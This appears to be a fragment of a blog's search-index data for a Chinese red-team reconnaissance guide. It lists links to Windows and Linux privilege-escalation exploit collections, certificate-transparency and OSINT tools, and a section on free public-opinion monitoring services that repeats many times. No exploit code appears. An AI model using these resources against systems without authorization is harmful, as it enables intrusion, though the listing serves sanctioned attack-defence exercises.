一款win下辅助提权的小工具 https://github.com/hlldz/dazzleUP wesng – Windows利用辅助工具 https://github.com/bitsadmin/wesng Windows-Exploit-Suggester Windows提权辅助 https://github.com/AonCyberLabs/Windows-Exploit-Suggester windows-kernel-exploits Windows平台提权漏洞集合 https://github.com/SecWiki/windows-kernel-exploits linux-kernel-exploits Linux平台提权漏洞集合 https://github.com/SecWiki/linux-kernel-exploits ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:16","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x16-在线提权辅助工具或一些提权相关的漏洞"},{"categories":["hvv"],"content":"\r0x17 SSL/TLS证书查询SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。 名称 地址 亚洲诚信-SSL/TLS安全评估 https://myssl.com/ AUTO-EARN https://github.com/Echocipher/AUTO-EARN ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:17","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x17-ssltls证书查询"},{"categories":["hvv"],"content":"\r0x18 OSINT调查平台工具 名称 地址 iKy https://kennbroorg.gitlab.io/ikyweb/PS：电子邮件收集信息并以漂亮的可视界面显示结果的工具 Boardreader https://boardreader.com/ PS：搜索全球各个论坛平台的内容。 blackhat线上会议 https://www.blackhat.com/us-20/briefings/schedule/ CTFR https://github.com/UnaPibaGeek/ctfr 滥用证书透明度日志，允许在几秒钟内获取子域。 DNS 聚合器 https://dnsdumpster.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:18","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x18-osint调查平台工具"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x19-其它信息收集"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#金石舆情监测系统"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#马克斯舆情监测免费版"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#中科微步"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#微步商情"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#探索者互联网舆情监测系统免费"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#舆情录"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 